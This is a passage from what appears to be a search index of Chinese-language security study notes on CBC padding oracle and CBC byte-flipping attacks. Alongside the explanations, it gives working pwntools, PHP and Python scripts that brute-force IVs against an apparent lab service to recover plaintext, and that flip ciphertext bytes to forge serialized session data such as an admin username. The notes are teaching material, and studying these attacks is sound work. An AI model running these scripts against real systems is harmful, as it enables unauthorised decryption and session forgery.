u4f7f\u7528PKCS#5\u586b\u5145\u540e\u7684\u7ed3\u679c\uff08\u6bcf\u4e2a\u6570\u636e\u5757\u4e3a8\u5b57\u8282\u957f\uff09\u3002\u5982\u679c\u89e3\u5bc6\u540e\u7684\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u672b\u5c3e\u5e76\u975e\u8fd9\u4e9b\u5408\u6cd5\u7684\u5b57\u8282\u5e8f\u5217\uff0c\u5927\u90e8\u5206\u52a0/\u89e3\u5bc6\u7a0b\u5e8f\u90fd\u4f1a\u629b\u51fa\u4e00\u4e2a\u586b\u5145\u5f02\u5e38\u3002\u8fd9\u4e2a\u5f02\u5e38\u5bf9\u4e8e\u653b\u51fb\u8005\u5c24\u4e3a\u5173\u952e\uff0c\u5b83\u662fPaddingOracle Attack\u7684\u57fa\u7840\u3002</p> <p>\u4e4b\u540e\u5173\u4e8e\u6f0f\u6d1e\u90e8\u5206\u53c2\u8003\u6587\u7ae0\uff1ahttps://www.freebuf.com/articles/web/15504.html</p> <p>https://www.jianshu.com/p/ad8bdd87e131</p>"},{"location":"web_bak/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_1","title":"\u539f\u7406","text":"<p>\u8fd9\u91cc\u7b80\u5355\u7684\u7a0d\u5fae\u9610\u8ff0\uff1a</p> <p>CBC(Cipher Block Chaining CBC)\u6a21\u5f0f</p> <p>\u8fd9\u662f\u4e00\u79cd\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u4f7f\u539f\u672c\u72ec\u7acb\u7684\u5206\u7ec4\u5bc6\u7801\u52a0\u5bc6\u8fc7\u7a0b\u5f62\u6210\u8fed\u4ee3\uff0c\u4f7f\u6bcf\u6b21\u52a0\u5bc6\u7684\u7ed3\u679c\u5f71\u54cd\u5230\u4e0b\u4e00\u6b21\u52a0\u5bc6\u3002\u8fd9\u884c\u53ef\u4ee5\u5f3a\u5316\u52a0\u5bc6\u7b97\u6cd5\u7684\"\u654f\u611f\u6027\"\uff0c\u5373\u5b9e\u73b0\u6240\u8c13\u7684\"\u96ea\u5d29\u6548\u5e94\"\uff0c\u5728\u9999\u6d53\u7406\u8bba\u4e2d\u8fd9\u5c31\u662f\"\u6270\u4e71\u539f\u5219\"\u3002</p> <p>\u524d\u51e0\u4e2a\u5206\u7ec4\u7684\u89e3\u5bc6\u7ed3\u679c\u5bf9\u6211\u4eec\u90fd\u6ca1\u6709\u610f\u4e49\uff0c\u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u7684\u662f\u6700\u540e\u4e00\u4e2a\u5206\u7ec4\u7684\u89e3\u5bc6\u7ed3\u679c\u3002\u770b\u8fd9\u5f20\u56fe\u53ef\u80fd\u4f1a\u6e05\u695a\u4e00\u70b9:</p> <p></p> <p>\u5728PaddingOracle Attack\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u8f93\u5165\u7684\u53c2\u6570\u662fIV+Cipher\uff0c\u6211\u4eec\u8981\u901a\u8fc7\u5bf9IV\u7684\"\u7a77\u4e3e\"\u6765\u8bf7\u6c42\u670d\u52a1\u5668\u7aef\u5bf9\u6211\u4eec\u6307\u5b9a\u7684Cipher\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u5bf9\u8fd4\u56de\u7684\u7ed3\u679c\u8fdb\u884c\u5224\u65ad\u3002</p> <ol> <li> <p>\u653b\u51fb\u8005\u80fd\u591f\u83b7\u5f97\u5bc6\u6587\uff08Ciphertext\uff09\uff0c\u4ee5\u53ca\u9644\u5e26\u5728\u5bc6\u6587\u524d\u9762\u7684IV\uff08\u521d\u59cb\u5316\u5411\u91cf\uff09</p> </li> <li> <p>\u653b\u51fb\u8005\u80fd\u591f\u89e6\u53d1\u5bc6\u6587\u7684\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u4e14\u80fd\u591f\u77e5\u9053\u5bc6\u6587\u7684\u89e3\u5bc6\u7ed3\u679c</p> </li> </ol> <p>\u4e0eCBC\u7ffb\u8f6c\u653b\u51fb\u4e0d\u540c\u7684\u5730\u65b9\u662f\u6211\u4eec\u8fd9\u91cc\u4e0d\u77e5\u9053\u89e3\u5bc6\u4e4b\u540e\u7684\u660e\u6587\uff0c\u53ea\u77e5\u9053\u5e76\u53ef\u63a7IV\u548c\u5bc6\u6587\uff0c\u5bf9\u4e86 \u8fd8\u6709\u89e3\u5bc6\u662f\u5426\u6210\u529f</p> <p>\u89e3\u5bc6\u662f\u5426\u6210\u529f\u8fd9\u4e2a\u70b9\u6210\u4e3a\u4e86padding oracle\u653b\u51fb\u81f3\u5173\u91cd\u8981\u7684\u4e00\u70b9\uff0c</p> <p>\u56e0\u4e3a\u6211\u4eec\u77e5\u9053padding\u53ea\u80fd\u4e3a\uff1a</p> <p>data0x01 \u6216</p> <p>data0x02 0x02 \u6216</p> <p>data0x03 0x03 0x03 \u6216</p> <p>data0x04 0x04 0x04 0x04 \u6216</p> <p>data0x05 0x05 0x05 0x05 0x05 \u6216</p> <p>......</p> <p>\u90a3\u5982\u679c\u51fa\u73b0\u4ee5\u4e0b\u8fd9\u79cdpadding\u7684\u65f6\u5019\u4f1a\u600e\u4e48\u6837\u5462\uff1f</p> <p>data0x05 0x05</p> <p>\uff08\u6b63\u5e38\u6765\u8bf4\u8fd9\u4e2apadding\u5e94\u4e3adata 0x05 0x05 0x05 0x05 0x05\uff09</p> <p>\u90a3\u89e3\u5bc6\u4e4b\u540e\u7684\u68c0\u9a8c\u5c31\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u56e0\u4e3apadding\u7684\u4f4d\u6570\u548cpadding\u5185\u5bb9\u4e0d\u4e00\u81f4</p> <p>\u5982\u679c\u8fd9\u4e2a\u670d\u52a1\u6ca1\u6709catch\u8fd9\u4e2a\u9519\u8bef\u7684\u8bdd\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u4e2d\u9014\u62a5\u9519\u9000\u51fa\uff0c\u8868\u73b0\u4e3a\uff0c\u5982http\u670d\u52a1\u7684status code\u4e3a500.</p>"},{"location":"web_bak/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_2","title":"CBC Padding Oracle\u653b\u51fb","text":"<p>\u7406\u89e3\u8fd9\u91cc\u7684\u5173\u952e\u5728\u4e8e\u610f\u8bc6\u5230\u670d\u52a1\u5668\u62e5\u6709\u7684\u662f\u6211\u4eec\u63d0\u4ea4\u8fc7\u7a0b\u4e2d\u7684\u4e2d\u95f4\u503c\uff0c\u5b83\u53ea\u7ed9\u4e0e\u5f62\u5f0f\u4e0a\u7684\u5224\u65ad\u800c\u4e0d\u4f1a\u53bb\u4e0e\u660e\u6587\u4e0e\u8fdb\u884c\u6b63\u786e\u4e0e\u5426\u7684\u5339\u914d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e00\u6b21\uff0c\u6211\u4eec\u63d0\u4ea4\uff08xxxxxxx0x\uff0800--ff\uff09\uff09\u53ea\u6709\u6700\u540e\u4e00\u4f4d\u7684\u6570\u503c\uff0c\u8fd9\u65f6\u5019\uff0c\u7531\u4e8e0x01\u20140x08\u5728\u660e\u6587\u4e2d\u4e0d\u53ef\u80fd\u51fa\u73b0\uff0c\u56e0\u6b64\uff0c\u76f8\u5f53\u4e8e\u5f02\u6216\u540e\u7684\u4f2a\u660e\u6587\u4e3azzzzzzzzzzzzz0x01\u8fd9\u65f6\u5019\u53ef\u4ee5\u5f97\u5230\u6211\u4eec\u5229\u7528\u6700\u540e\u4e00\u7ec4\u5bc6\u6587\u7ecf\u8fc7des\u6216aes\u52a0\u5bc6\u5f97\u5230\u7684\u4e2d\u95f4\u503c\uff0c\u6700\u540e\u5c06\u8be5\u4e2d\u95f4\u503c\u4e0e\u5bc6\u94a5\u76f8\u5e94\u7684\u4f4d\u505a\u5f02\u6216\u5373\u53ef\uff0c\u90a3\u4e48\u4e4b\u540e\u6211\u4eec\u9700\u8981\u5f97\u5230\u7684\u662f\u5012\u6570\u7b2c\u4e8c\u4f4d\uff0c\u6b64\u65f6\u4f2a\u660e\u6587\u5e94\u8be5\u4e3azzzzzzzzz0x02 0x02\uff0c\u7531\u4e8e\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e2d\u95f4\u503c\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u90a3\u4e48\u6211\u4eec\u63d0\u4ea4\u7684IV\u503c\u6700\u540e\u4e00\u4f4d\u5e94\u8be5\u6ee1=0x02^\u4e2d\u95f4\u503c\u6700\u540e\u4e00\u4f4d\uff0c\u4e4b\u540e\u7531\u540c\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u63a8\u51fa\u7206\u7834\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u503c\uff0c\u6211\u4eec\u6bcf\u6b21\u63a8\u76f8\u5f53\u4e8e\u5f97\u5230\u7684\u662f\u4e2d\u95f4\u503c\uff0c\u4e14\u6bcf\u6b21\u4fdd\u6301\u4e00\u4f4d\u6765\u8fdb\u884c\u771f\u6216\u5047\u7684\u7206\u7834\u3002</p>"},{"location":"web_bak/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_3","title":"\u653b\u51fb\u811a\u672c","text":"<p>\u548csql\u6ce8\u5165\u7684\u811a\u672c\u5f88\u7c7b\u4f3c\uff0c\u90fd\u662f\u731c\u6d4b\uff0c\u7136\u540e\u4ece\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u7684\u4e00\u4e2abool\u5224\u65ad</p> <p>\u770b\u5f97\u61c2sql\u6ce8\u5165\u5c31\u4e00\u5b9a\u80fd\u770b\u7684\u61c2\u7f62\uff08\u65e0\u6148\u60b2\u8bf7\uff09\uff1a</p> <pre><code>from pwn import *\nimport base64 as b64\n\nIV = ['\\x00'] * 16\nsecret = 'nPQctp6AezY8BcGPjlYW8Pv+Fpo15LeatsVbj47jqgE='\nsecret1 = b64.b64decode(secret)[0:16]\nsecret2 = b64.b64decode(secret)[16:]\np = remote('10.188.2.20',10010)\nmiddle = []\npt = ''\n\nfor x in xrange(0,16):\n    for y in xrange(0,256):\n        p.recvuntil(\"Give your option:\\n\")\n        p.sendline('3')\n        p.recvuntil(\"IV:\\n\")\n        p.sendline(b64.b64encode(''.join(IV))) #send your IV\n        p.recvuntil(\"Data:\\n\")\n        p.sendline(b64.b64encode(secret1)) #send your Data\n        # p.sendline(b64.b64encode(secret2)) #send your Data\n        res = p.recvuntil(\"\\n\")\n        # print res\n        if 'bad decrypt' in res:\n            IV[15-x] = chr(y)\n        elif 'Decrpytion Done' in res:\n            print IV\n            IV[15-x] = chr(ord(IV[15-x]) ^ (x + 1)) #to get the correct middle, just like ---&gt; IV[0] ^ 0x01 = middle[0]\n            middle.append(ord(IV[15-x])) #store the correct middle\n            print middle\n            pt += chr(ord(IV[15-x]) ^ ord('A')) #first plaint text\n            # pt += chr(ord(IV[15-x]) ^ ord(secret1[15-x])) #second plaint text\n            for z in xrange(0,x + 1):\n                IV[15-z] = chr(middle[z] ^ (x + 2)) #generate the next new IV\n            break\n        else:\n            print res\n            exit()\n        if y == 255:\n            print '[!] Something wrong'\n            print x + 1\n            exit()\n\nprint '[!] Final IV : '\nprint IV\nprint '[!] Get middle : ', middle\nprint '[!] PlaintText is : ' + pt[::-1]\n\n#######################################################################\n\n2\uff1a\nfrom pwn import *\nimport base64 as b64\n\nsecret = 'nPQctp6AezY8BcGPjlYW8Pv+Fpo15LeatsVbj47jqgE='\nsecret1 = b64.b64decode(secret)[0:16]\nsecret2 = b64.b64decode(secret)[16:]\np = remote('10.188.2.20',10010)\n\nmiddle = []\npadding = ''\n\nfor x in xrange(1,17):\n    for y in xrange(0,256):\n        IV = \"\\x00\" * (16-x) + chr(y) + padding\n\n        p.recvuntil(\"Give your option:\\n\")\n        p.sendline(\"3\")\n\n        p.recvuntil(\"IV:\\n\")\n        p.sendline(b64.b64encode(IV))\n\n        p.recvuntil(\"Data:\\n\")\n        p.sendline(b64.b64encode(secret2))\n\n        res = p.recvuntil(\"\\n\")\n        if 'Decrpytion Done' in res:\n            middle.append(y ^ x) #calculate and store the correct middle\n            print middle\n            padding = ''\n            for z in middle:\n                padding = chr((x+1) ^ z) + padding #generate the next new IV tail\n            break\n\nflag = \"\"\nfor x,y in zip(middle,secret1[::-1]):\n    # flag += chr(x ^ ord('A')) #for secret1\n    flag += chr(x ^ ord(y)) #for secret2\nprint flag[::-1]\n</code></pre>"},{"location":"web_bak/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/","title":"CBC\u5b57\u8282\u7ffb\u8f6c\u653b\u51fb","text":"<p>\u7ffb\u8f6c\u5b57\u8282\u653b\u51fb\u5e94\u8be5\u4f1a\u78b0\u5230\u86ee\u591a</p> <p>\u662fCBC Padding Oracle\u7684\u57fa\u7840\u90e8\u5206\uff0c\u5efa\u8bae\u5148\u7406\u89e3\u6e05\u695a\u8fd9\u4e2a\u518d\u53bb\u5b66\u4e60padding oracle</p>"},{"location":"web_bak/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#feistel","title":"Feistel\u6846\u67b6","text":"<p>\u9996\u5148\u9700\u8981\u4ecb\u7ecd\u7684\u662f\u8fd9\u4e2a\u540d\u4e3a\uff26\uff45\uff49\uff53\uff54\uff45\uff4c\u7684\u6846\u67b6</p> <p></p> <p>\u6211\u4eec\u4e0d\u9700\u8981\u8ba4\u6e05\u695aDES\u4e4b\u4e2d\u7684S\u76d2\u4e2d\uff08\u751f\u6210\u5bc6\u94a5\u65f6\u6240\u4f7f\u7528\uff09\u7684\u52a0\u5bc6\u7b97\u6cd5</p> <p>\u53ea\u9700\u8981\u6e05\u695a\u4e00\u4e0b\u6d41\u7a0b\uff0c\u7406\u89e3\u8fd9\u4e2a\u5f02\u6216\u5373\u53ef</p> <p>\u8fd9\u4e48\u7406\u89e3</p> <p>\u9996\u5148\u7ed9\u51fa\u660e\u6587\u548c\u5bc6\u94a5</p> <p>\u7136\u540e\u52a0\u5bc6</p> <p>\u52a0\u5bc6\u6d41\u7a0b\u662f\u8fd9\u6837\u7684</p> <p>\u660e\u6587\u7684\u53f3\u534a\u90e8\u5206\u4f5c\u4e3a\u4e0b\u4e00\u7ea7\u52a0\u5bc6\u660e\u6587\u7684\u5de6\u534a\u90e8\u5206</p> <p>\u53f3\u534a\u90e8\u5206\u518d\u548c\u5bc6\u94a5F\uff08F\u6307\u67d0\u9879\u64cd\u4f5c\uff0c\u53ef\u4ee5\u7406\u89e3\u6210\u67d0\u4e2a\u51fd\u6570\uff09\u4e4b\u540e\uff0c\u5c06\u7ed3\u679c\u548c\u5de6\u534a\u90e8\u5206\u5f02\u6216\u4f5c\u4e3a\u4e0b\u4e00\u7ea7\u52a0\u5bc6\u660e\u6587\u7684\u53f3\u534a\u90e8\u5206\uff0c\u5faa\u73af16\u6b21\uff08\u4e00\u822c\u662f16\u6b21\uff09\u3002</p>"},{"location":"web_bak/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_1","title":"\u653b\u51fb\u59ff\u52bf","text":"<p>CBC\u6a21\u5f0f\u7684\u5168\u79f0\u662fCipher Block Chaining\u6a21\u5f0f\uff08\u5bc6\u6587\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\uff09\uff0c\u4e4b\u6240\u4ee5\u53eb\u8fd9\u4e2a\u540d\u5b57\uff0c\u662f\u56e0\u4e3a\u5bc6\u6587\u5206\u7ec4\u50cf\u94fe\u6761\u4e00\u6837\u76f8\u4e92\u8fde\u63a5\u5728\u4e00\u8d77\u3002</p> <p>\u5728CBC\u6a21\u5f0f\u4e2d\uff0c\u9996\u5148\u5c06\u660e\u6587\u5206\u7ec4\u4e0e\u524d\u4e00\u4e2a\u5bc6\u6587\u5206\u7ec4\u8fdb\u884cXOR\u8fd0\u7b97\uff0c\u7136\u540e\u518d\u8fdb\u884c\u52a0\u5bc6\u3002(\u4e2a\u4eba\u611f\u89c9\u662f\u5f88\u50cfDES\u52a0\u5bc6\u7684\u6d41\u7a0b)</p> <p>\u796d\u51fa\u8fd9\u5f20\u56fe\uff08\u5c31\u662f\u524d\u9762\u5c06\u5f97\u5230Feistel\u6846\u67b6\uff09</p> <p></p>"},{"location":"web_bak/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_2","title":"\u52a0\u5bc6\u8fc7\u7a0b\uff1b","text":"<p>\u9996\u5148\u5c06\u660e\u6587\u5206\u6210\u6bcfX\u4f4d\u4e00\u7ec4\uff0c\u4f4d\u6570\u4e0d\u8db3\u7684\u662f\u7528\u7279\u6b8a\u5b57\u7b26\u586b\u5145 \uff01\uff01\uff01\uff01\uff01\uff01\uff01</p> <p>X\u5e38\u89c1\u7684\u4e3a16\u4f4d\uff0c\u4e5f\u670932\u4f4d</p> <p>\u8fd9\u91cc\u8981\u6ce8\u610f\uff0cCBC\u7684\u586b\u5145\u89c4\u5219\u662f\u7f3a\u5c11N\u4f4d\uff0c\u5c31\u7528 N \u4e2a '\\xN'\u586b\u5145\uff0c\u5982\u7f3a\u5c1110\u4f4d\u5219\u7528 10 \u4e2a '\\x10'\u586b\u5145\uff08\u8fd9\u91cc\u662f\u6838\u5fc3\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\u867d\u7136\u4e0d\u662f\u8fd9\u91cc\u7684\uff09</p> <p>\u7136\u540e\u751f\u6210\u521d\u59cb\u5411\u91cfIV(\u8fd9\u91cc\u7684\u521d\u59cb\u5411\u91cf\u5982\u679c\u672a\u7279\u5b9a\u7ed9\u51fa\u5219\u968f\u673a\u751f\u6210)\u548c\u5bc6\u94a5</p> <p>\u5c06\u521d\u59cb\u5411\u91cf\u4e0e\u7b2c\u4e00\u7ec4\u660e\u6587\u5f02\u6216\u751f\u6210\u5bc6\u6587A</p> <p>\u7528\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u6587A \u5f97\u5230\u5bc6\u6587A_1</p> <p>\u91cd\u590d3 \u5c06\u5bc6\u6587A_1\u4e0e\u7b2c\u4e8c\u7ec4\u660e\u6587\u5f02\u6216\u751f\u6210\u5bc6\u6587B</p> <p>\u91cd\u590d4 \u7528\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u6587B_1</p> <p>\u91cd\u590d3-6 \u76f4\u5230\u6700\u540e\u4e00\u7ec4\u660e\u6587</p> <p>\u5c06IV\u548c\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u5bc6\u6587</p> <p>\u7531\u4e8e\u662f\u5f02\u6216\uff0c\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u662f\u4e2a\u53ef\u9006\u5f97\u5230\u8fd0\u7b97\u8fc7\u7a0b</p>"},{"location":"web_bak/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_3","title":"\u89e3\u5bc6\u8fc7\u7a0b\uff1b","text":"<p>\u9996\u5148\u4ece\u6700\u7ec8\u7684\u5bc6\u6587\u4e2d\u63d0\u53d6\u51faIV (IV\u4e3a\u52a0\u5bc6\u65f6\u6307\u5b9a\u7684X\u4f4d)</p> <p>\u5c06\u5bc6\u6587\u5206\u7ec4</p> <p>\u4f7f\u7528\u5bc6\u94a5\u5bf9\u7b2c\u4e00\u7ec4\u5bc6\u6587\u89e3\u5bc6\u5f97\u5230\u5bc6\u6587A\uff0c\u7136\u540e\u7528IV\u8fdb\u884c\u5f02\u6216\u5f97\u5230\u7b2c\u4e00\u7ec4\u660e\u6587</p> <p>\u4f7f\u7528\u5bc6\u94a5\u5bf9\u7b2c\u4e8c\u7ec4\u5bc6\u6587\u89e3\u5bc6\u5f97\u5230\u5bc6\u6587B\uff0c\u7136\u540e\u7528A\u4e0eB\u8fdb\u884c\u5f02\u6216\u5f97\u5230\u7b2c\u4e8c\u7ec4\u660e\u6587</p> <p>\u91cd\u590d3-4 \u76f4\u5230\u6700\u540e\u4e00\u7ec4\u5bc6\u6587</p>"},{"location":"web_bak/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_4","title":"\u653b\u51fb\u8fc7\u7a0b","text":"<p>\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u5047\u8bbeA\u4e3a\u660e\u6587\uff0cB\u4e3a\u524d\u4e00\u7ec4\u5bc6\u6587\uff0cC\u4e3a\u5bc6\u6587\u7ecf\u8fc7\u5bc6\u94a5\u89e3\u5bc6\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\uff1a</p> <p>$A = Plaintext[0] = 11 ;</p> <p>$B = Ciphertext[0] = 13 ;</p> <p>$C = Decrypt(Ciphertext)[0] = 6 ;</p> <p>\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u6211\u4eec\u662f\u7528 C\u4e0eB \u5f02\u6216\u5f97\u5230A\uff0c \u5373 C ^ B = A</p> <p>\u6839\u636e\u89e3\u5bc6\u65b9\u5f0f\u6211\u4eec\u53ef\u4ee5\u77e5\u9053</p> <p>$C ^ Old_IV= Source_str</p> <p>//\u6240\u4ee5</p> <p>$C = Old_IV^ Source_str</p> <p>//\u5e76\u4e14\u6211\u4eec\u8fd8\u9700\u8981</p> <p>$C ^ New_IV= Target_str</p> <p>//\u5373</p> <p>$C = New_IV^ Target_str</p> <p>//\u6240\u4ee5</p> <p>Old_IV ^Source_str = New_IV ^ Target_str</p> <p>//\u6240\u4ee5</p> <p>New_IV =Old_IV ^ Source_str ^ Target_str</p> <p>\u6240\u4ee5\u8bf4\u6211\u4eec\u53ea\u9700\u8981\u4fee\u6539\u524d\u4e00\u7ec4\u5bc6\u6587\u6240\u5bf9\u5e94\u7684\u672c\u7ec4\u660e\u6587\u76f8\u540c\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u5373\u53ef\u5f97\u5230\u60f3\u8981\u7684\u660e\u6587\u3002</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u6ce8\u610f\u5230\u524d\u4e00\u5757Ciphertext\u7528\u6765\u4ea7\u751f\u4e0b\u4e00\u5757\u660e\u6587\uff0c\u5982\u679c\u6211\u4eec\u6539\u53d8\u524d\u4e00\u5757Ciphertext\u4e2d\u7684\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u548c\u4e0b\u4e00\u5757\u89e3\u5bc6\u540e\u7684\u5bc6\u6587xor\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4e0d\u540c\u7684\u660e\u6587\uff0c\u800c\u8fd9\u4e2a\u660e\u6587\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u5c31\u6b3a\u9a97\u670d\u52a1\u7aef\u6216\u8005\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u3002</p> <p>CBC\u7ffb\u8f6c\u5b57\u8282\u653b\u51fb_\u85af\u6761\u732b\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>CBC\u7ffb\u8f6c\u5b57\u8282\u653b\u51fbCBC\u52a0\u5bc6\u8fc7\u7a0b\uff08\u5bc6\u6587\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\u5f02\u6216\u540e\u52a0\u5bc6\u653b\u51fb\u70b9\u4e3aIV\u6216\u8005\u52a0\u5bc6\u540e\u7684\u67d0\u6bb5\u5bc6\u6587\u6539\u7b2c\u4e00\u7ec4\u660e\u6587\u7684\u4fe1\u606f\uff0c\u9700\u8981\u66f4\u6539IVA = Plaintext[0] = 'h' ;B = IV[0] =  \u53ef\u63a7;C = Decrypt(Ciphertext)[0] = ?;//\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f2a\u9020\u4e00\u4e2a\u65b0\u7684IV\u5411\u91cf\uff0c\u4f7f\u5f97C ^ New_IV = \u6211\u4eec\u9700\u8981\u7684\u660e\u6587//\u56e0\u4e3a\u6709 C ^ Old_IV = Source_str//\u6240\u4ee5C = Old_IV ^ Source_str//\u5e76\u4e14</p> <p>https://blog.csdn.net/weixin_44843084/article/details/106736385</p> <p>\u6309\u7167\u4e2a\u4eba\u7684\u7406\u89e3\uff0c\u5c31\u662f\u5728\u6b63\u5e38\u7684CBC\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u66ff\u6362\u539f\u672c\u7684\u6587\u672c\uff0c\u6709\u70b9\u4f2a\u9020session\u7684\u5473\u9053</p>"},{"location":"web_bak/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_5","title":"\u653b\u51fb\u811a\u672c","text":"<pre><code>&lt;?php\n$enc=base64_decode(\"bIpgPK29vVQosJ+smzh0pOdq7QrP3H9CN0MBfynL1eKtILs/ayew1snTYbeYSIz8rQctkAUMORS76SWQHXwuKg==\");\n$enc[13] = chr(ord($enc[13]) ^ ord(\"k\") ^ ord (\"n\"));\necho base64_encode($enc);\n?&gt;\n#####################################################################\n&lt;?php\n$enc=base64_decode(\"4quudO++PAeVPQfcFJ0bbm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==\");\n$iv=base64_decode(\"TrphJjWLH37sj6+EBqh28A==\");\n$cleartext = 'a:2:{s:8:\"userna';\n$newiv = '';\nfor ($i=0;$i&lt;16;$i++){\n$newiv=$newiv.chr(ord($iv[$i]) ^ ord($enc[$i]) ^ ord ($cleartext[$i]));\n}\necho base64_encode($newiv);\n?&gt;\n\u90a3\u4e48\u8fd9\u91cc\u4e5f\u540c\u6837\u7684\u7ed9\u51fa\u4e24\u4e2a\u811a\u672c\uff1a\u7b2c\u4e00\u4e2a\u811a\u672c\u5c31\u662f\u5728\u53cd\u8f6c\u8fc7\u7a0b\u4e2d\u7684\u5b57\u7b26\u7684CBC\u653b\u51fb\uff0c\u4f46\u7531\u4e8e\u6b64\u5904\u4fee\u6539\u7b2c\u4e8c\u4e32\u5b57\u7b26\u4e32\u7684\u503c\u662f\u7531\u4fee\u6539\u7b2c\u4e00\u4e32\u5b57\u7b26\u4e32\u7ec4\u6210\u7684\uff0c\u800c\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u7531\u521d\u59cb\u5411\u91cfIV\u6240\u5f97\u5230\u7684\uff0c\u56e0\u6b64\u4e5f\u8981\u76f8\u5e94\u7684\u4fee\u6539IV\u7684\u503c\u624d\u80fd\u591f\u6b63\u5e38\u7684\u5f97\u5230\u89e3\u6790\u3002\n\n\u4e0b\u9762\u518d\u653e\u4e24\u4e2apython\u7684\u811a\u672c\uff1b\n\n\nimport base64\nimport requests\nimport urllib\niv_raw='%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D'  #\u8fd9\u91cc\u586b\u5199\u7b2c\u4e00\u6b21\u8fd4\u56de\u7684iv\u503c\ncipher_raw='8WdhbPxjZy9xYAgoCeghiOUQu0ri1Y3dv7cX44MbvOfIC6zZxCbR%2FPFpeMatL5qIgT%2BYA66tIdCBpxtWsWxV9Q%3D%3D'  #\u8fd9\u91cc\u586b\u5199\u7b2c\u4e00\u6b21\u8fd4\u56de\u7684cipher\u503c\nprint \"[*]\u539f\u59cbiv\u548ccipher\"\nprint \"iv_raw:  \" + iv_raw\nprint \"cipher_raw:  \" + cipher_raw\nprint \"[*]\u5bf9cipher\u89e3\u7801\uff0c\u8fdb\u884c\u53cd\u8f6c\"\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n#s:2:{s:8:\"userna\n#me\";s:5:\"zdmin\";\n#s:8:\"password\";s\n#:3:\"12345\";}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord('z') ^ ord('a')) + cipher[10:]  #\u8bf7\u6839\u636e\u4f60\u7684\u8f93\u5165\u81ea\u884c\u66f4\u6539\uff0c\u539f\u7406\u770b\u4e0a\u9762\u7684\u4ecb\u7ecd\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint \"\u53cd\u8f6c\u540e\u7684cipher\uff1a\" + xor_cipher\n\u8fd9\u662f\u4fee\u6539\u4e32\u4e2d\u7684\n\n#######################################################################\nimport base64\nimport urllib\ncipher = 'Bc6oENSSAEPpPdv/rbqRZG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'#\u586b\u5199\u63d0\u4ea4\u540e\u6240\u5f97\u7684\u65e0\u6cd5\u53cd\u5e8f\u5217\u5316\u5bc6\u6587\niv = '%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D'#\u4e00\u5f00\u59cb\u63d0\u4ea4\u7684iv\n#cipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = ''\nright = 'a:2:{s:8:\"userna'#\u88ab\u635f\u574f\u524d\u6b63\u786e\u7684\u660e\u6587\nfor i in range(16):\nnewIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #\u8fd9\u4e00\u6b65\u76f8\u5f53\u4e8e\u628a\u539f\u6765iv\u4e2d\u4e0d\u5339\u914d\u7684\u90e8\u5206\u4fee\u6539\u8fc7\u6765\nprint 